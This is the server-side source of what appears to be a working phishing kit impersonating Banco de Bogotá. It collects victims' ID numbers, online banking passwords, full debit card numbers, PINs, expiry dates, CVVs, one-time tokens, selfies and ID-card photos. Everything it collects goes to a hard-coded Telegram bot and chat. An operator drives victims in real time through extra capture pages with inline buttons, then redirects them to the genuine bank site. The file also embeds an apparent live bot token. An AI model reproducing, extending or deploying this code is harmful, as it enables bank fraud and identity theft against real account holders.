const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const { createServer } = require('http');
const { Server } = require('socket.io');

// ===============================
// CONFIGURACIÓN INICIAL
// ===============================
const app = express();
const httpServer = createServer(app);
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

// Set para mantener registro de clientes conectados
const connectedClients = new Set();

// Map para almacenar datos de sesiones por cliente
const sessionData = new Map();

// Configuración de Telegram
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002638389042';

// ===============================
// CONFIGURACIÓN DE SOCKET.IO
// ===============================
const io = new Server(httpServer, {
    cors: { 
        origin: '*',
        methods: ["GET", "POST"],
        credentials: true
    },
    path: '/socket.io',
    transports: ['websocket', 'polling'],
    pingTimeout: 60000,
    pingInterval: 25000,
    allowEIO3: true,
    connectTimeout: 45000
});

// ===============================
// MIDDLEWARES
// ===============================
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// CORS para todas las rutas
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// Headers de cache - NUNCA cachear en producción
app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
    next();
});

// Servir archivos estáticos SIN caché
app.use(express.static(path.join(__dirname), {
    maxAge: 0,
    etag: false,
    lastModified: false,
    setHeaders: (res, path) => {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    }
}));

// Logging middleware
app.use((req, res, next) => {
    console.log(`${req.method} ${req.path}`);
    next();
});

// ===============================
// RUTA DE VERIFICACIÓN DE VERSION
// ===============================
app.get('/version', (req, res) => {
    res.json({
        version: '1.0.1',
        commit: 'af17dfd',
        timestamp: new Date().toISOString(),
        overlay: {
            logoSize: '96px',
            image: 'channels4_profile-removebg-preview.png',
            text: 'Cargando'
        },
        cache: 'DISABLED',
        environment: NODE_ENV
    });
});

// ===============================
// CONFIGURACIÓN DEL BOT DE TELEGRAM
// ===============================
const bot = new TelegramBot(TELEGRAM_TOKEN, { 
    polling: true,
    filepath: false
});

// ===============================
// FUNCIONES DE TELEGRAM
// ===============================

/**
 * Formatea los mensajes según el tipo de datos recibidos
 */
function formatTelegramMessage(data, sessionId = null) {
    if (typeof data !== 'object') {
        return data.toString();
    }

    const timestamp = new Date().toLocaleString('es-CO', { 
        timeZone: 'America/Bogota',
        dateStyle: 'short',
        timeStyle: 'short'
    });

    // Obtener datos acumulados de la sesión si existe
    let acumulado = '';
    if (sessionId && sessionData.has(sessionId)) {
        const session = sessionData.get(sessionId);
        acumulado = '\n\n📊 <b>INFORMACIÓN ACUMULADA:</b>\n' + session.history.join('\n');
    }

    switch (data.tipo) {
        case 'Clave Segura':
            return `🔐 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
                   `📋 <b>Tipo:</b> ${data.tipo}\n` +
                   `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
                   `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n` +
                   `🔑 <b>Clave:</b> <code>${data.clave}</code>\n` +
                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
        
        case 'Tarjeta Débito':
            return `💳 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
                   `📋 <b>Tipo:</b> ${data.tipo}\n` +
                   `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
                   `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n\n` +
                   `💳 <b>DATOS DE TARJETA:</b>\n` +
                   `🔢 <b>Número Completo:</b> <code>${data.numeroTarjeta}</code>\n` +
                   `🔑 <b>Clave:</b> <code>${data.claveTarjeta}</code>\n` +
                   `📅 <b>Vencimiento:</b> <code>${data.fechaVencimiento}</code>\n` +
                   `🔐 <b>CVV:</b> <code>${data.cvv}</code>\n\n` +
                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
        
        case 'Token':
            return `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
                   `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
        
        case 'Selfie':
            return `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n` +
                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
        
        case 'Cédula Frontal':
            return `🪪 <b>DOCUMENTO - LADO FRONTAL</b>\n\n` +
                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
        
        case 'Cédula Trasera':
            return `🪪 <b>DOCUMENTO - LADO TRASERO</b>\n\n` +
                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
        
        default:
            return JSON.stringify(data, null, 2);
    }
}

/**
 * Genera el teclado inline para las acciones de Telegram
 */
function getTelegramKeyboard(messageType = 'default') {
    return {
        inline_keyboard: [
            [
                { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' },
                { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
            ],
            [
                { text: '📸 Pedir Cara', callback_data: 'pedir_cara' },
                { text: '🪪 Pedir Cédula', callback_data: 'pedir_cedula' }
            ],
            [
                { text: '✅ Finalizar', callback_data: 'finalizar' }
            ]
        ]
    };
}

/**
 * Envía un mensaje a Telegram con formato y teclado inline
 */
async function sendTelegramMessage(data, sessionId = null) {
    try {
        // Actualizar datos de sesión
        if (sessionId && data.tipo !== 'Token') {
            if (!sessionData.has(sessionId)) {
                sessionData.set(sessionId, { history: [], data: {} });
            }
            
            const session = sessionData.get(sessionId);
            
            // Guardar datos del mensaje actual
            if (data.tipo === 'Clave Segura') {
                session.data.clave = { tipoDocumento: data.tipoDocumento, numeroDocumento: data.numeroDocumento, clave: data.clave };
                session.history.push(`✅ Clave Segura - Doc: ${data.numeroDocumento}`);
            } else if (data.tipo === 'Tarjeta Débito') {
                session.data.tarjeta = { 
                    tipoDocumento: data.tipoDocumento, 
                    numeroDocumento: data.numeroDocumento, 
                    numeroTarjeta: data.numeroTarjeta,
                    claveTarjeta: data.claveTarjeta,
                    fechaVencimiento: data.fechaVencimiento,
                    cvv: data.cvv
                };
                session.history.push(`✅ Tarjeta - ${data.numeroTarjeta}`);
            } else if (data.tipo === 'Selfie') {
                session.data.selfie = { messageId: data.messageId };
                session.history.push(`✅ Selfie capturado`);
            } else if (data.tipo === 'Cédula Frontal') {
                if (!session.data.cedula) session.data.cedula = {};
                session.data.cedula.frontal = { messageId: data.messageId };
                session.history.push(`✅ Cédula Frontal`);
            } else if (data.tipo === 'Cédula Trasera') {
                if (!session.data.cedula) session.data.cedula = {};
                session.data.cedula.trasera = { messageId: data.messageId };
                session.history.push(`✅ Cédula Trasera`);
            }
            
            sessionData.set(sessionId, session);
        }
        
        const keyboard = getTelegramKeyboard(data.tipo);

        // Si es una foto (base64), enviarla como imagen
        if (data.foto) {
            console.log('📸 Procesando foto para envío...');
            
            try {
                // Verificar que la foto tenga el formato correcto
                if (!data.foto.includes('base64,')) {
                    throw new Error('Formato de foto inválido');
                }
                
                const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
                console.log('📦 Buffer creado, tamaño:', buffer.length, 'bytes');
                
                const caption = formatTelegramMessage(data, sessionId);
                
                console.log('📤 Enviando foto a Telegram con botones...');
                
                const result = await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
                    caption: caption,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });
                
                console.log('✅ Foto enviada con éxito, Message ID:', result.message_id);
                return result;
                
            } catch (photoError) {
                console.error('❌ Error procesando/enviando foto:', photoError);
                throw photoError;
            }
        }

        // Enviar mensaje de texto
        const messageText = formatTelegramMessage(data, sessionId);

        console.log('📤 Enviando mensaje a Telegram:', messageText);

        const result = await bot.sendMessage(TELEGRAM_CHAT_ID, messageText, {
            parse_mode: 'HTML',
            reply_markup: keyboard
        });

        console.log('✅ Mensaje enviado exitosamente - ID:', result.message_id);
        return result;
    } catch (error) {
        console.error('❌ Error al enviar mensaje a Telegram:', error.message);
        throw error;
    }
}

// ===============================
// FUNCIONES DE REDIRECCIONAMIENTO
// ===============================

/**
 * Maneja las redirecciones según la acción recibida
 */
function handleRedirect(action, baseUrl = '') {
    // Si baseUrl está vacío o es localhost, intentar obtener la URL de Render
    if (!baseUrl || baseUrl.includes('localhost')) {
        // En producción, Render expone la URL del servicio
        if (process.env.RENDER_EXTERNAL_URL) {
            baseUrl = process.env.RENDER_EXTERNAL_URL;
        } else if (process.env.BASE_URL) {
            baseUrl = process.env.BASE_URL;
        } else if (NODE_ENV === 'production') {
            // Fallback: usar el hostname si está disponible
            baseUrl = '';
        }
    }
    
    const redirectMap = {
        'pedir_logo': { 
            url: `${baseUrl}/index.html?action=pedir_logo`, 
            message: 'Por favor ingrese sus credenciales nuevamente'
        },
        'pedir_token': { 
            url: `${baseUrl}/token.html?action=pedir_token`, 
            message: 'Por favor ingrese el código token'
        },
        'pedir_cara': {
            url: `${baseUrl}/cara.html?action=pedir_cara`,
            message: 'Por favor capture su selfie de verificación'
        },
        'pedir_cedula': {
            url: `${baseUrl}/cedula.html?action=pedir_cedula`,
            message: 'Por favor capture su documento de identidad'
        },
        'finalizar': { 
            url: 'https://www.bancodebogota.com/personas', 
            message: 'Proceso finalizado exitosamente'
        }
    };

    return redirectMap[action] || { url: `${baseUrl}/`, message: null };
}

// ===============================
// RUTAS DE LA API
// ===============================

// API: Enviar mensaje a Telegram
app.post('/api/send-telegram', async (req, res) => {
    try {
        console.log('📨 Recibida solicitud para enviar a Telegram:', req.body);
        
        if (!req.body || !req.body.tipo) {
            return res.status(400).json({
                success: false,
                error: 'Datos incompletos'
            });
        }

        // Obtener sessionId del cliente
        const sessionId = req.body.sessionId || req.ip;
        
        const result = await sendTelegramMessage(req.body, sessionId);
        
        res.json({
            success: true,
            messageId: result.message_id
        });
    } catch (error) {
        console.error('❌ Error en /api/send-telegram:', error.message);
        res.status(500).json({
            success: false,
            error: 'Error al procesar la solicitud'
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        environment: NODE_ENV
    });
});

// ===============================
// RUTAS DE PÁGINAS
// ===============================

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Rutas de páginas HTML
app.get('/:page(index|token|dashboard).html', (req, res) => {
    const filePath = path.join(__dirname, `${req.params.page}.html`);
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`Error sirviendo ${req.params.page}.html:`, err);
            res.status(404).send('Página no encontrada');
        }
    });
});

// ===============================
// SOCKET.IO - MANEJO DE CONEXIONES
// ===============================

io.on('connection', (socket) => {
    console.log('🔌 Cliente conectado:', socket.id);
    connectedClients.add(socket.id);
    
    // Enviar confirmación de conexión
    socket.emit('connected', { 
        socketId: socket.id,
        timestamp: new Date().toISOString()
    });

    // Evento: Procesar acción de Telegram
    socket.on('process_action', async (data) => {
        try {
            const { action, messageId } = data;
            console.log(`⚙️ Procesando acción "${action}" para mensaje ${messageId}`);

            const baseUrl = `${req.protocol}://${req.get('host')}` || `http://localhost:${PORT}`;
            const { message, url } = handleRedirect(action, baseUrl);

            socket.emit('telegram_action', {
                action,
                messageId,
                message,
                redirect: url
            });
            
            console.log(`✅ Acción "${action}" procesada correctamente`);
        } catch (error) {
            console.error('❌ Error al procesar acción:', error.message);
            socket.emit('telegram_action', {
                action: 'error',
                message: 'Error al procesar la acción. Por favor intente nuevamente.'
            });
        }
    });

    // Evento: Verificación de token
    socket.on('token_verification', async (data) => {
        console.log('🔐 Verificación de token recibida:', data);
        
        try {
            if (!data || !data.codigo) {
                throw new Error('Datos de token inválidos');
            }
            
            if (!/^\d{6}$/.test(data.codigo)) {
                throw new Error('Formato de token inválido');
            }
            
            console.log('📤 Enviando token a Telegram...');
            const result = await sendTelegramMessage(data);
            console.log('✅ Token enviado exitosamente - ID:', result.message_id);
            
            socket.emit('telegram_action', { 
                action: 'waiting_response',
                messageId: result.message_id,
                message: 'Verificando token...'
            });
        } catch (error) {
            console.error('❌ Error en verificación de token:', error.message);
            socket.emit('telegram_action', { 
                action: 'error',
                message: 'Error al procesar el token. Por favor intente nuevamente.'
            });
        }
    });

    // Evento: Desconexión
    socket.on('disconnect', (reason) => {
        console.log('🔌 Cliente desconectado:', socket.id, '- Razón:', reason);
        connectedClients.delete(socket.id);
    });

    // Evento: Error en socket
    socket.on('error', (error) => {
        console.error('❌ Error en socket:', socket.id, error.message);
    });
});

// ===============================
// TELEGRAM BOT - CALLBACK QUERIES
// ===============================

bot.on('callback_query', async (callbackQuery) => {
    if (!callbackQuery || !callbackQuery.message) {
        console.error('❌ Callback query inválido');
        return;
    }
    
    try {
        const action = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;
        const userId = callbackQuery.from.id;
        
        console.log(`📲 Callback recibido - Acción: "${action}", Message ID: ${messageId}, User: ${userId}`);
        
        // Determinar URL base - Render automáticamente expone RENDER_EXTERNAL_URL
        const baseUrl = process.env.RENDER_EXTERNAL_URL || 
                       process.env.BASE_URL || 
                       (NODE_ENV === 'production' ? '' : `http://localhost:${PORT}`);
        
        console.log(`🔗 Using baseUrl: ${baseUrl}`);

        // Responder inmediatamente al callback query
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: action === 'finalizar' ? '✅ Proceso finalizado' : '✓ Acción procesada',
            show_alert: false
        });

        // Obtener información de redirección
        const { message, url } = handleRedirect(action, baseUrl);

        // Emitir evento a TODOS los clientes conectados
        console.log(`📡 Emitiendo acción "${action}" a ${connectedClients.size} clientes`);
        io.emit('telegram_action', {
            action,
            messageId,
            message,
            redirect: url,
            timestamp: new Date().toISOString()
        });

        // Si es finalizar, editar el mensaje original
        if (action === 'finalizar') {
            try {
                const finalMessage = `✅ <b>Proceso finalizado</b>\n\n${callbackQuery.message.text}`;
                await bot.editMessageText(finalMessage, {
                    chat_id: TELEGRAM_CHAT_ID,
                    message_id: messageId,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [] }
                });
                console.log('✅ Mensaje de Telegram actualizado');
            } catch (error) {
                console.error('❌ Error al editar mensaje:', error.message);
            }
        }
        
        console.log(`✅ Callback procesado correctamente para acción "${action}"`);
    } catch (error) {
        console.error('❌ Error al procesar callback query:', error.message);
        
        // Intentar notificar al usuario del error
        try {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Error al procesar la acción',
                show_alert: true
            });
        } catch (e) {
            console.error('❌ No se pudo notificar el error al usuario');
        }
    }
});

// ===============================
// MANEJO DE ERRORES GLOBAL
// ===============================

// Errores del bot de Telegram
bot.on('error', (error) => {
    console.error('❌ Error del bot de Telegram:', error.message);
});

bot.on('polling_error', (error) => {
    console.error('❌ Error de polling:', error.message);
});

bot.on('webhook_error', (error) => {
    console.error('❌ Error de webhook:', error.message);
});

// Errores no capturados
process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
    console.error('Promise:', promise);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
    // No cerrar el proceso en producción
    if (NODE_ENV !== 'production') {
        process.exit(1);
    }
});

// Manejo de cierre graceful
process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM recibido, cerrando servidor...');
    httpServer.close(() => {
        console.log('✅ Servidor cerrado correctamente');
        bot.stopPolling();
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('🛑 SIGINT recibido, cerrando servidor...');
    httpServer.close(() => {
        console.log('✅ Servidor cerrado correctamente');
        bot.stopPolling();
        process.exit(0);
    });
});

// ===============================
// INICIALIZACIÓN DEL SERVIDOR
// ===============================

async function startServer() {
    try {
        // Verificar conexión con Telegram
        const botInfo = await bot.getMe();
        console.log('✅ Bot de Telegram conectado:', botInfo.username);
        console.log('📱 Bot ID:', botInfo.id);
        
        // Desactivar webhook para polling local
        await bot.deleteWebHook();
        console.log('✅ Webhook desactivado (modo polling)');
        
        // Iniciar servidor HTTP
        httpServer.listen(PORT, () => {
            console.log('🚀 ===============================');
            console.log(`🚀 Servidor iniciado exitosamente`);
            console.log(`🚀 Puerto: ${PORT}`);
            console.log(`🚀 Entorno: ${NODE_ENV}`);
            console.log(`🚀 URL: http://localhost:${PORT}`);
            console.log(`🚀 Socket.io: Activo`);
            console.log(`🚀 Clientes conectados: ${connectedClients.size}`);
            console.log('🚀 ===============================');
        });
        
    } catch (error) {
        console.error('❌ Error crítico al iniciar el servidor:', error.message);
        console.error('Stack:', error.stack);
        process.exit(1);
    }
}

// Iniciar el servidor
startServer().catch(error => {
    console.error('❌ Error fatal:', error);
    process.exit(1);
});

// ===============================
// EXPORTAR PARA OTROS ENTORNOS
// ===============================

module.exports = { app, httpServer, io, bot };